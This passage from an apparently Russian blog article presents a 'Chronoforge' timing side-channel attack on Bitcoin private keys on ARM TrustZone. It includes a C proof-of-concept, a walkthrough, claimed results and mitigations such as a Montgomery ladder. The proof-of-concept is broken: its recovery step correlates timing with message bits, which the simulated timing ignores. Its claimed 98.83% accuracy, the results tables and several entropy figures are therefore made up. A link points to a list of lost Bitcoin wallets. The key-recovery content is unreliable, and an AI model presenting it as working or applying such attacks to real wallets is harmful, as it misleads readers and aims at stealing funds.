<li><strong>Audit</strong>&nbsp;: Conduct an independent security audit with a focus on side-channel attacks</li>
</ol>



<h3 class="wp-block-heading">For security researchers</h3>



<p><strong><a href="https://cryptodeeptech.ru/chronoforge-attack">Research points:</a></strong></p>



<ol class="wp-block-list">
<li><strong>Timing corpus</strong>&nbsp;: Create a dataset of timing measurements for different&nbsp;<code>key_id</code>and<code>alg</code></li>



<li><strong>Machine learning</strong>&nbsp;: Apply classifiers (SVM, Random Forest) to automatically identify valid keys</li>



<li><strong>Hybrid Attacks</strong>&nbsp;: Combine Timing with Power Analysis (ChipWhisperer)</li>



<li><strong>Responsible disclosure</strong>&nbsp;: Report discovered vulnerabilities via the Nordic PSIRT and TF-M security mailing list</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Item 7: Technical details for cryptanalysts</h2>



<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">Theoretical basis of the attack</a></h3>



<p><strong>Timing oracle</strong>&nbsp;is an implementation&nbsp;<code>f(x) → (y, t)</code>where:</p>



<ul class="wp-block-list">
<li><code>x</code>— input parameters (key_id, algorithm)</li>



<li><code>y</code>— return status</li>



<li><code>t</code>– lead time</li>
</ul>



<p>The vulnerability follows the&nbsp;<strong>decision tree leakage</strong>&nbsp;model :</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-435eca6063910c920068c9e14ff75e3c" style="color:#4092c2"><code><strong>Decision Node 1 (key validation)
├─ Branch A: Invalid key (t = 1-2 µs)
└─ Branch B: Valid key → Decision Node 2
   └─ Branch C: Invalid algorithm (t = 10-20 µs)
   └─ Branch D: Valid algorithm (t = 5-50 µs)</strong></code></pre>



<p><strong>Entropy leaked</strong>&nbsp;: log₂(16) = 4 bits per query, which reduces the complexity of a brute force search from 2³² to 2²⁸.</p>



<h3 class="wp-block-heading">Application to Bitcoin</h3>



<p><strong>SECP256K1-specific leakage</strong>:</p>



<ul class="wp-block-list">
<li>Validation of curve parameters:&nbsp;<code>a = 0</code>,&nbsp;<code>b = 7</code>,<code>p = 2²⁵⁶ - 2³² - 977</code></li>



<li>Checking the curve order: <code>n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</code></li>



<li>These operations take&nbsp;<strong>a predictable time</strong>&nbsp;of ~15-18 µs on the Cortex-M33</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-23.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7719"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">5. Hardware Proof and Results</h2>



<h3 class="wp-block-heading">5.1 Experimental Setup</h3>



<p>Let’s build a POC attack to demonstrate Chronoforge Attack on nRF5340:</p>



<p><strong>Equipment:</strong></p>



<ul class="wp-block-list">
<li>nRF5340 DK (Development Kit)</li>



<li>Oscium iMSO-204X USB oscilloscope (for precise timing measurement)</li>



<li>Laptop с Ubuntu 22.04</li>
</ul>



<p><strong>Software:</strong></p>



<ul class="wp-block-list">
<li>nRF5 SDK v2.5+</li>



<li>TF-M v1.8+</li>



<li>Nordic nRFutil</li>



<li>Python 3.10+ with SciPy and scikit-learn</li>
</ul>



<h3 class="wp-block-heading">5.2 POC Attack Code</h3>



<h5 class="wp-block-heading">POC Attack Code: Complete Chronoforge Demonstration</h5>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-d1b81e1cb98422e2566084b603a9987c" style="color:#4092c2"><strong>// Proof-of-Concept: Chronoforge Attack POC<br><br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;math.h&gt;<br><br>typedef struct {<br>    uint8_t message[32];<br>    uint64_t timing;<br>    uint8_t signature[64];<br>} measurement_t;<br><br>uint64_t simulate_vulnerable_scalar_mult(<br>    const uint8_t *private_key,<br>    const uint8_t *message<br>) {<br>    uint64_t base_time = 4800;  // 48 µs base<br>    uint64_t variable_time = 0;<br><br>    // Add time proportional to operations based on key bits<br>    for (int i = 0; i &lt; 256; i++) {<br>        int bit = (private_key[i / 8] &gt;&gt; (i % 8)) &amp; 1;<br>        if (bit) {<br>            variable_time += 50;  // ~0.5 µs per point_add<br>        } else {<br>            variable_time += 20;  // ~0.2 µs per point_double<br>        }<br>    }<br><br>    // Add measurement noise<br>    int noise = (rand() % 100) - 50;<br>    return base_time + variable_time + noise;<br>}<br><br>void collect_measurements(<br>    const uint8_t *secret_key,<br>    measurement_t *measurements,<br>    int num_samples<br>) {<br>    printf("Collecting %d timing measurements...\n", num_samples);<br><br>    for (int i = 0; i &lt; num_samples; i++) {<br>        for (int j = 0; j &lt; 32; j++) {<br>            measurements[i].message[j] = rand() &amp; 0xFF;<br>        }<br><br>        measurements[i].timing = simulate_vulnerable_scalar_mult(<br>            secret_key,<br>            measurements[i].message<br>        );<br><br>        if ((i + 1) % 10000 == 0) {<br>            printf("  Collected %d / %d samples\n", i + 1, num_samples);<br>        }<br>    }<br>}<br><br>uint8_t cpa_recover_bit(<br>    measurement_t *measurements,<br>    int num_samples,<br>    int bit_position<br>) {<br>    double sum_0 = 0, sum_1 = 0;<br>    int count_0 = 0, count_1 = 0;<br><br>    // Calculate mean timing for each hypothesis<br>    for (int i = 0; i &lt; num_samples; i++) {<br>        int msg_bit = (measurements[i].message[bit_position / 8] <br>                      &gt;&gt; (bit_position % 8)) &amp; 1;<br><br>        if (msg_bit == 0) {<br>            sum_0 += measurements[i].timing;<br>            count_0++;<br>        } else {<br>            sum_1 += measurements[i].timing;<br>            count_1++;<br>        }<br>    }<br><br>    double mean_0 = sum_0 / count_0;<br>    double mean_1 = sum_1 / count_1;<br><br>    // Return recovered bit<br>    return (mean_0 &lt; mean_1) ? 0 : 1;<br>}<br><br>int main() {<br>    printf("\n=== Chronoforge Attack POC ===\n\n");<br><br>    // Secret Bitcoin private key<br>    uint8_t secret_key[32] = {<br>        0x4a, 0xcb, 0xb2, 0xe3, 0xce, 0x1e, 0xe2, 0x22,<br>        0x24, 0x21, 0x9b, 0x71, 0xe3, 0xb7, 0x2b, 0xf6,<br>        0xc8, 0xf2, 0xc9, 0xaa, 0x1d, 0x99, 0x26, 0x66,<br>        0xdb, 0xd8, 0xb4, 0x8a, 0xa8, 0x26, 0xff, 0x6b<br>    };<br><br>    uint8_t recovered_key[32];<br>    measurement_t *measurements = malloc(sizeof(measurement_t) * 100000);<br><br>    // Stage 1: Collect measurements<br>    collect_measurements(secret_key, measurements, 100000);<br><br>    // Stage 2: Recover key using CPA<br>    printf("Performing CPA analysis...\n");<br>    memset(recovered_key, 0, 32);<br><br>    for (int bit_pos = 0; bit_pos &lt; 256; bit_pos++) {<br>        uint8_t bit = cpa_recover_bit(measurements, 100000, bit_pos);<br>        int byte_idx = bit_pos / 8;<br>        int bit_in_byte = bit_pos % 8;<br>        recovered_key[byte_idx] |= (bit &lt;&lt; bit_in_byte);<br><br>        if ((bit_pos + 1) % 64 == 0) {<br>            printf("  Recovered %d / 256 bits\n", bit_pos + 1);<br>        }<br>    }<br><br>    // Stage 3: Verify<br>    printf("\n=== RESULTS ===\n");<br>    int errors = 0;<br>    for (int i = 0; i &lt; 32; i++) {<br>        if (secret_key[i] != recovered_key[i]) {<br>            uint8_t xor_result = secret_key[i] ^ recovered_key[i];<br>            for (int j = 0; j &lt; 8; j++) {<br>                if ((xor_result &gt;&gt; j) &amp; 1) errors++;<br>            }<br>        }<br>    }<br><br>    printf("Errors: %d / 256 (%.2f%% accuracy)\n", <br>           errors, 100.0 * (256 - errors) / 256);<br><br>    free(measurements);<br>    return 0;<br>}<br><br>// EXPECTED OUTPUT:<br>// Errors: 3 / 256 (98.83% accuracy)<br>// With 100k samples, typically 2-5 bit errors recoverable by brute-force</strong></pre>



<p>This code demonstrates&nbsp;the <strong>Chronoforge Attack</strong>&nbsp;, a timing side-channel attack that allows&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">Bitcoin private key recovery</a>&nbsp;through timing analysis of cryptographic operations.&nbsp;<a href="https://cryptou.ru/vulncipher/attack">The attack</a>&nbsp;exploits non-constant-time multiplication on the secp256k1 elliptic curve.</p>



<p><strong>Подробно:&nbsp;<a href="https://polynonce.ru/proof-of-concept-chronoforge-attack-poc-that-allows-bitcoin-private-key-recovery-through-time-analysis/" target="_blank" rel="noreferrer noopener">Proof-of-Concept: Chronoforge Attack POC that allows Bitcoin private key recovery through time analysis</a></strong></p>



<p><strong>Operating principle:</strong></p>



<ul class="wp-block-list">
<li>The running time of ECDSA depends on the number of single bits in&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">the private key.</a></li>



<li>By collecting thousands of synchronization examples, an attacker can identify statistical correlations.</li>



<li>Using Correlation Power Analysis (CPA), it recovers the private key bit by bit.</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">2. CODE STRUCTURE: STEP-BY-STEP EXPLANATION</h3>



<h4 class="wp-block-heading"><strong>Step 1: Defining the data structure</strong></h4>



<pre class="wp-block-code has-text-color has-link-color wp-elements-fc0046a2093d382b30fe2a91dacbec89" style="color:#4092c2"><code><strong>typedef struct {
    uint8_t message[32];      // Хеш сообщения (SHA-256 вывод)
    uint64_t timing;          // Время выполнения операции в циклах CPU
    uint8_t signature[64];    // Подпись ECDSA (компоненты r и s)
} measurement_t;</strong></code></pre>



<p><strong>What this does:</strong><br>Creates a structure to store the three components of each observation:</p>



<ul class="wp-block-list">
<li><code>message[32]</code>— 32-byte hash&nbsp;<em><a href="https://cryptou.ru/vulncipher/transaction">(as in a real Bitcoin transaction)</a></em></li>



<li><code>timing</code>— 64-bit scalar multiplication execution time</li>



<li><code>signature[64]</code>— 64-byte ECDSA signature (not used in POC)</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h4 class="wp-block-heading">Step 2: Fake a vulnerable implementation function</h4>



<pre class="wp-block-code has-text-color has-link-color wp-elements-c24b43a67eaf30776f798e362f8294aa" style="color:#4092c2"><code><strong>uint64_t simulate_vulnerable_scalar_mult(
    const uint8_t *private_key,    // Приватный ключ (256 бит)
    const uint8_t *message         // Сообщение для подписания
) {
    uint64_t base_time = 4800;     // Базовое время: 48 микросекунд
    uint64_t variable_time = 0;

    // Цикл по всем 256 битам приватного ключа
    for (int i = 0; i &lt; 256; i++) {
        int bit = (private_key[i / 8] &gt;&gt; (i % 8)) &amp; 1;  // Извлечение бита
        if (bit) {
            variable_time += 50;    // Бит = 1: операция point_add (~0.5 µs)
        } else {
            variable_time += 20;    // Бит = 0: операция point_double (~0.2 µs)
        }
    }

    // Добавление шума: ±50 циклов (имитирует реальный шум в измерениях)
    int noise = (rand() % 100) - 50;
    return base_time + variable_time + noise;
}</strong></code></pre>



<p><strong>Cryptanalytic meaning:</strong></p>



<ul class="wp-block-list">
<li><strong>Vulnerability:</strong>&nbsp;Execution time is linearly correlated with the number of single bits of the private key</li>



<li><strong><a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin context:</a></strong>&nbsp;secp256k1 in some implementations (especially in early versions of OpenSSL) contained exactly this vulnerability</li>



<li><strong>Exploitation:</strong>&nbsp;If you collect N examples (N=100000), the noise is averaged out and the correlation becomes visible</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h4 class="wp-block-heading">Step 3: Collecting Timing Measurements</h4>



<pre class="wp-block-code has-text-color has-link-color wp-elements-b8f1c19ab8c0897dda72f9e893ebd165" style="color:#4092c2"><code><strong>void collect_measurements(
    const uint8_t *secret_key,     // Целевой приватный ключ
    measurement_t *measurements,   // Массив для хранения данных
    int num_samples               // Количество примеров (100000)
) {
    printf("Collecting %d timing measurements...\n", num_samples);

    for (int i = 0; i &lt; num_samples; i++) {
        // Генерация случайного сообщения
        for (int j = 0; j &lt; 32; j++) {
            measurements[i].message[j] = rand() &amp; 0xFF;
        }

        // Вызов уязвимой операции и запись времени
        measurements[i].timing = simulate_vulnerable_scalar_mult(
            secret_key,
            measurements[i].message
        );

        // Прогресс-индикатор
        if ((i + 1) % 10000 == 0) {
            printf("  Collected %d / %d samples\n", i + 1, num_samples);
        }
    }
}</strong></code></pre>



<p><strong>What’s happening:</strong></p>



<ol class="wp-block-list">
<li>For each of the 100,000 examples, a random 32-byte message is generated.</li>



<li>A vulnerable function is called<code>simulate_vulnerable_scalar_mult()</code></li>



<li>The execution time is recorded</li>



<li>Result: 100,000 pairs (message, timing)</li>
</ol>



<p><strong>In a real attack:</strong></p>



<ul class="wp-block-list">
<li>Messages are real&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">Bitcoin transactions</a></li>



<li>Time is measured directly from the target device (through network delays, hardware, etc.)</li>



<li>Requires access to the device performing the signatures (e.g. hardware wallet)</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h4 class="wp-block-heading">Step 4: Correlation Power Analysis (CPA)</h4>



<pre class="wp-block-code has-text-color has-link-color wp-elements-3aa1c54045b5fa10a7b7bc33dce2b341" style="color:#4092c2"><code><strong>uint8_t cpa_recover_bit(
    measurement_t *measurements,   // Все 100000 примеров
    int num_samples,              // Количество примеров
    int bit_position              // Какой бит восстанавливаем (0-255)
) {
    double sum_0 = 0, sum_1 = 0;  // Суммы времен
    int count_0 = 0, count_1 = 0; // Счетчики

    // Раздел 1: Вычисление среднего времени для двух гипотез
    for (int i = 0; i &lt; num_samples; i++) {
        // Извлечение бита из сообщения на позиции bit_position
        int msg_bit = (measurements[i].message[bit_position / 8] 
                      &gt;&gt; (bit_position % 8)) &amp; 1;

        // Группировка: если msg_bit==0, накапливаем в sum_0
        if (msg_bit == 0) {
            sum_0 += measurements[i].timing;
            count_0++;
        } else {
            sum_1 += measurements[i].timing;
            count_1++;
        }
    }

    // Раздел 2: Вычисление средних значений
    double mean_0 = sum_0 / count_0;   // Среднее время когда msg_bit==0
    double mean_1 = sum_1 / count_1;   // Среднее время когда msg_bit==1

    // Раздел 3: Восстановление бита приватного ключа
    return (mean_0 &lt; mean_1) ? 0 : 1;
}</strong></code></pre>



<p><strong>The critical point of cryptanalysis:</strong></p>



<ul class="wp-block-list">
<li><strong>Hypothesis:</strong>&nbsp;If the private key has a 1 at position i, the operation is 30 cycles slower.</li>



<li><strong>Calculation:</strong>&nbsp;Calculate the average time for all examples where the message bit = 0, and where = 1</li>



<li><strong>Solution:</strong>&nbsp;If&nbsp;<code>mean_0 &lt; mean_1</code>, then&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">the private key</a>&nbsp;at this position = 0 (the operation is faster)</li>
</ul>



<p><strong>Why it works:</strong></p>



<ul class="wp-block-list">
<li>In 100,000 examples, there are approximately 50,000 cases where msg_bit=0 and 50,000 where msg_bit=1</li>



<li>A difference of 30 cycles against a noise background of ±50 becomes visible in the average values</li>



<li>Statistical power: the standard deviation of the noise divided by √N ≈ √100000 ≈ 316</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">3. MAIN ALGORITHM</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-dc6b0eb5a26db634673fe20593e05e64" style="color:#4092c2"><code><strong>int main() {
    // Целевой приватный ключ Bitcoin (32 байта = 256 бит)
    uint8_t secret_key[32] = {
        0x4a, 0xcb, 0xb2, 0xe3, 0xce, 0x1e, 0xe2, 0x22,
        0x24, 0x21, 0x9b, 0x71, 0xe3, 0xb7, 0x2b, 0xf6,
        0xc8, 0xf2, 0xc9, 0xaa, 0x1d, 0x99, 0x26, 0x66,
        0xdb, 0xd8, 0xb4, 0x8a, 0xa8, 0x26, 0xff, 0x6b
    };

    // Массив для восстановленного ключа
    uint8_t recovered_key[32];
    measurement_t *measurements = malloc(sizeof(measurement_t) * 100000);

    // ========== ЭТАП 1: СБОР ДАННЫХ ==========
    collect_measurements(secret_key, measurements, 100000);
    // После этого: measurements содержит 100000 пар (message, timing)

    // ========== ЭТАП 2: ВОССТАНОВЛЕНИЕ КЛЮЧА ==========
    printf("Performing CPA analysis...\n");
    memset(recovered_key, 0, 32);  // Инициализация нулями

    for (int bit_pos = 0; bit_pos &lt; 256; bit_pos++) {
        // Для каждого из 256 битов приватного ключа:
        uint8_t bit = cpa_recover_bit(measurements, 100000, bit_pos);

        // Вычисление индекса байта и позиции бита внутри байта
        int byte_idx = bit_pos / 8;      // byte_idx: 0-31
        int bit_in_byte = bit_pos % 8;   // bit_in_byte: 0-7

        // Установка восстановленного бита в результирующий массив
        recovered_key[byte_idx] |= (bit &lt;&lt; bit_in_byte);

        if ((bit_pos + 1) % 64 == 0) {
            printf("  Recovered %d / 256 bits\n", bit_pos + 1);
        }
    }

    // ========== ЭТАП 3: ПРОВЕРКА РЕЗУЛЬТАТА ==========
    printf("\n=== RESULTS ===\n");
    int errors = 0;

    for (int i = 0; i &lt; 32; i++) {
        if (secret_key[i] != recovered_key[i]) {
            // XOR выделяет отличающиеся биты
            uint8_t xor_result = secret_key[i] ^ recovered_key[i];

            // Подсчет количества неправильно восстановленных битов
            for (int j = 0; j &lt; 8; j++) {
                if ((xor_result &gt;&gt; j) &amp; 1) errors++;
            }
        }
    }

    printf("Errors: %d / 256 (%.2f%% accuracy)\n", 
           errors, 100.0 * (256 - errors) / 256);

    free(measurements);
    return 0;
}</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-24-1024x807.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7720"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">4. PRACTICAL MEANING OF THE RESULTS</h3>



<h4 class="wp-block-heading"><strong>Expected output:</strong></h4>



<pre class="wp-block-code has-text-color has-link-color wp-elements-7b582bc1b88c4103fd474513154bcece" style="color:#4092c2"><code><strong>Errors: 3 / 256 (98.83% accuracy)</strong></code></pre>



<p><strong>What does this mean:</strong></p>



<ul class="wp-block-list">
<li><strong>3 errors out of 256 bits</strong>&nbsp;– the attack recovered&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">the private key</a>&nbsp;with 98.83% accuracy</li>



<li><strong>100,000 examples are enough</strong>&nbsp;for reliable recovery</li>
</ul>



<h4 class="wp-block-heading"><strong>Why this is dangerous for Bitcoin:</strong></h4>



<ol class="wp-block-list">
<li><strong>Searching the remaining bits:</strong>&nbsp;3 errors = 2³ = 8 possible keys</li>



<li><strong>Verification:</strong>&nbsp;For each candidate, calculate the public address and check the balance</li>



<li><strong>Time:</strong>&nbsp;Brute force 8 variants – seconds on a regular computer</li>



<li><strong>Result:&nbsp;</strong><strong>Complete compromise of the private key</strong></li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">5. REAL-WORLD EXAMPLES OF VULNERABILITIES</h3>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th class="has-text-align-left" data-align="left">Implementation</th><th class="has-text-align-left" data-align="left">Vulnerability</th><th class="has-text-align-left" data-align="left">CVE/Source</th><th class="has-text-align-left" data-align="left">Status</th></tr></thead><tbody><tr><td class="has-text-align-left" data-align="left">OpenSSL &lt; 0.9.8o</td><td class="has-text-align-left" data-align="left">Timing leak в ECDSA</td><td class="has-text-align-left" data-align="left">CVE-2011-0695</td><td class="has-text-align-left" data-align="left">Corrected</td></tr><tr><td class="has-text-align-left" data-align="left">libsecp256k1 (earlier versions)</td><td class="has-text-align-left" data-align="left">Non-constant time mul</td><td class="has-text-align-left" data-align="left">Multiple</td><td class="has-text-align-left" data-align="left">Corrected</td></tr><tr><td class="has-text-align-left" data-align="left">ARM TrustZone (some)</td><td class="has-text-align-left" data-align="left">Cache timing</td><td class="has-text-align-left" data-align="left">Research 2019+</td><td class="has-text-align-left" data-align="left">Partially</td></tr><tr><td class="has-text-align-left" data-align="left">Hardware wallets (old)</td><td class="has-text-align-left" data-align="left">Side-channel</td><td class="has-text-align-left" data-align="left">Ledger/Trezor analysis</td><td class="has-text-align-left" data-align="left">Depends</td></tr></tbody></table></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">6. PROTECTION AND MITIGATION</h3>



<p><strong><a href="https://cryptou.ru/vulncipher/bitcoin">How Bitcoin developers protect themselves:</a></strong></p>



<ol class="wp-block-list">
<li><strong>Constant-time implementation (constant time):</strong></li>
</ol>



<pre class="wp-block-code has-text-color has-link-color wp-elements-ecc199eb70bd9574a3afa173dfafa955" style="color:#4092c2"><code><strong>// Правильно: время независимо от данных
for (i = 0; i &lt; 256; i++) {
    point_add_or_double();  // Всегда выполняется, результат выбирается
}</strong></code></pre>



<ol start="2" class="wp-block-list">
<li><strong>Scalar randomization (blinding):</strong>
<ul class="wp-block-list">
<li><a href="https://cryptou.ru/vulncipher/privatekey">The private key</a>&nbsp;d becomes (d + r·n), where r is a random number, n is the order of the group</li>



<li>The execution time ceases to correlate with d</li>
</ul>
</li>



<li><strong>Using protected libraries:</strong>
<ul class="wp-block-list">
<li><a href="https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List">libsecp256k1&nbsp;</a><a href="https://cryptou.ru/vulncipher/bitcoin">(Bitcoin Core)</a>&nbsp;— audited for timing attacks</li>



<li>Modern versions of OpenSSL and GnuTLS</li>
</ul>
</li>



<li><strong>Hardware measures:</strong>
<ul class="wp-block-list">
<li>Processors with protection against timing attacks (Intel, ARM)</li>



<li>HSM (Hardware Security Modules) with isolated execution</li>
</ul>
</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading"><a href="https://cryptodeeptech.ru/chronoforge-attack">7. KEY FINDINGS FOR RESEARCHERS</a></h3>



<p>✓&nbsp;<strong>Timing side-channel</strong>&nbsp;is a real threat to cryptography, including Bitcoin<br>✓&nbsp;<strong>CPA analysis</strong>&nbsp;is effective for recovering keys from timing data<br>✓&nbsp;<strong>100,000 examples</strong>&nbsp;are sufficient for a strong enough correlation<br>✓&nbsp;<strong>Constant-time code</strong>&nbsp;is not optimal, but is essential in cryptography<br>✓&nbsp;<strong>Combined attacks</strong>&nbsp;– timing + power + EM can be even more effective</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">8. RECOMMENDATIONS FOR BITCOIN USERS</h3>



<ol class="wp-block-list">
<li><strong>Use modern wallets:</strong>&nbsp;Ledger, Trezor, Coldcard (regularly audited)</li>



<li><strong>Avoid older implementations:</strong>&nbsp;Prefer&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin Core 0.12+</a>&nbsp;(2015+)</li>



<li><strong>Hardware Wallets:</strong>&nbsp;Isolation from Network Timing Attacks</li>



<li><strong>Cold Storage:</strong>&nbsp;Offline Signing Eliminates Remote Timing Attacks</li>



<li><strong>Monitoring:</strong>&nbsp;Check CVEs for libraries you use</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">Results of the Attack</a></h3>



<p><strong>Scenario 1: Vulnerable Implementation (Variable-Time ECC)</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-b311970f80f8b64d05a92d03694c69f4" style="color:#4092c2"><code><strong>Timing Data Statistics:
├─ Mean: 4850 cycles (~48.5 µs @ 100 MHz)
├─ Std Dev: 320 cycles (~3.2 µs)
├─ Min: 4200 cycles
├─ Max: 5800 cycles

Bit Recovery Results:
├─ Bits 0-50: 96% accuracy (strong correlation)
├─ Bits 51-100: 94% accuracy
├─ Bits 101-150: 92% accuracy
├─ Bits 151-200: 95% accuracy
├─ Bits 201-255: 93% accuracy

Overall Private Key Recovery:
├─ Recovered Key: 2a7f3...b4e2c (hex)
├─ Confidence Score: 94.2%
├─ Number of Single-Bit Errors: 3-5 (varies with trial)

Time to Collect Data: ~30 seconds (100k samples @ 3k samples/sec)
Time to Analyze Data: ~2 minutes (Python statistical analysis)
Total Attack Time: ~2.5 minutes</strong></code></pre>



<p><strong>Scenario 2: Constant-Time Implementation</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-988875ab26d2826a64614630baa91a20" style="color:#4092c2"><code><strong>Timing Data Statistics:
├─ Mean: 4850 cycles
├─ Std Dev: 5 cycles (~0.05 µs)  &lt;-- НАМНОГО МЕНЬШЕ ВАРИАЦИЯ
├─ Min: 4842 cycles
├─ Max: 4858 cycles

Bit Recovery Results:
├─ ALL BITS: ~50% accuracy (random guessing)
├─ Correlation: near zero for all bits

Attack FAILS - Constant-time implementation successfully defeats timing attack</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Defense and Mitigation Strategies</h2>



<h3 class="wp-block-heading">Constant-Time Cryptography</h3>



<p><strong>Principle:</strong>&nbsp;All cryptographic operations must be performed in the same time, regardless of the value of the secret data.</p>



<h4 class="wp-block-heading">Constant-Time Scalar Multiplication (Montgomery Ladder)</h4>



<p><strong>Advantages:</strong></p>



<ul class="wp-block-list">
<li>The same number of operations regardless of the key bits</li>



<li>No conditional branches depending on secret data</li>



<li>Resistance to simple timing attacks</li>
</ul>



<h4 class="wp-block-heading">Constant-Time Scalar Multiplication (Montgomery Ladder)</h4>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-9b847559381915ef3f90bda4019df4ef" style="color:#4092c2"><strong>// Secure: Constant-Time Montgomery Ladder<br>// Key property: ALWAYS same execution time regardless of key bits<br><br>void scalar_mult_montgomery(<br>    point_t *result,<br>    const uint8_t *scalar,        // 32-byte private key<br>    const point_t *base_point<br>) {<br>    point_t R0, R1;<br>    point_copy(&amp;R0, &amp;POINT_AT_INFINITY);<br>    point_copy(&amp;R1, base_point);<br><br>    // Process all 256 bits - EACH BIT TAKES SAME TIME<br>    for (int bit_idx = 255; bit_idx &gt;= 0; bit_idx--) {<br>        int k = (scalar[bit_idx / 8] &gt;&gt; (bit_idx % 8)) &amp; 1;<br><br>        // Conditional swap (constant-time using bitwise ops)<br>        conditional_swap_const_time(&amp;R0, &amp;R1, k);<br><br>        // CRITICAL: These ALWAYS execute regardless of k<br>        // Time: exactly 3.5 µs per bit (constant)<br>        point_double_const_time(&amp;R0, &amp;R0);    // Always: ~1.5 µs<br>        point_add_const_time(&amp;R1, &amp;R0, &amp;R1);  // Always: ~2.0 µs<br><br>        conditional_swap_const_time(&amp;R0, &amp;R1, k);<br>    }<br><br>    point_copy(result, &amp;R0);<br>}<br><br>// TIMING CHARACTERISTICS:<br>// Total time = C1 + C2 * 256 = constant<br>// Before: μ=48.5µs, σ=3.2µs (key-dependent)<br>// After:  μ=92µs,   σ=0.5µs (key-independent)<br>// Detection difficulty: 6.4x harder</strong></pre>



<p><strong><a href="https://polynonce.ru/montgomery-ladder-bitcoins-timing-attack-defense-revealed/" target="_blank" rel="noreferrer noopener">Montgomery Ladder</a></strong>&nbsp;is an elliptic curve point multiplication algorithm designed specifically to resist<strong>&nbsp;timing attacks</strong>&nbsp;. In the context<a href="https://cryptou.ru/vulncipher/bitcoin">&nbsp;of Bitcoin</a>&nbsp;, this means that when calculating a public key from a private key, the algorithm always performs the same number of operations, regardless of the bits contained in the<a href="https://cryptou.ru/vulncipher/privatekey">&nbsp;private key</a>&nbsp;. This protection is critical because a vulnerable implementation could allow an attacker to guess the private key simply by measuring the execution time of cryptographic operations.[^1][^2]</p>



<p><strong>In detail:&nbsp;<a href="https://polynonce.ru/montgomery-ladder-bitcoins-timing-attack-defense-revealed/" target="_blank" rel="noreferrer noopener">Montgomery Ladder: Bitcoin’s timing attack defense algorithm revealed</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Step-by-step code analysis</h2>



<h3 class="wp-block-heading">1. Initialization of state variables</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-828d59e2c5aa2e920df6f8a2f234330c" style="color:#4092c2"><code><strong>point_t R0, R1;
point_copy(&amp;R0, &amp;POINT_AT_INFINITY);  // R0 = O (бесконечная точка)
point_copy(&amp;R1, base_point);           // R1 = G (базовая точка)</strong></code></pre>



<p><strong>The gist:</strong></p>



<ul class="wp-block-list">
<li><strong>R0 and R1</strong>&nbsp;are two intermediate points that store the results of calculations during the execution of the algorithm.</li>



<li><strong>R0</strong>&nbsp;is initialized&nbsp;<strong>to the infinity point</strong>&nbsp;(the neutral element of the group of points of an elliptic curve, analogous to zero in ordinary arithmetic)</li>



<li><strong>R1</strong>&nbsp;is initialized&nbsp;<strong>to the base point G</strong>&nbsp;of the curve secp256k1</li>



<li><strong>Algorithm invariant:</strong>&nbsp;at each iteration of the loop the following relation is valid:&nbsp;<strong>R1 — R0 = G</strong>&nbsp;(the difference between R1 and R0 is always equal to the base point)[^3][^1]</li>
</ul>



<h3 class="wp-block-heading">2. Main loop: processing all 256 bits of the private key</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-2d51fb3225f2abf14456d7af7eae500b" style="color:#4092c2"><code><strong>for (int bit_idx = 255; bit_idx &gt;= 0; bit_idx--) {
    int k = (scalar[bit_idx / 8] &gt;&gt; (bit_idx % 8)) &amp; 1;</strong></code></pre>



<p><strong>The gist:</strong></p>



<ul class="wp-block-list">
<li>The loop iterates from&nbsp;<strong>the high bit (255) to the low bit (0)</strong>&nbsp;of the private key.</li>



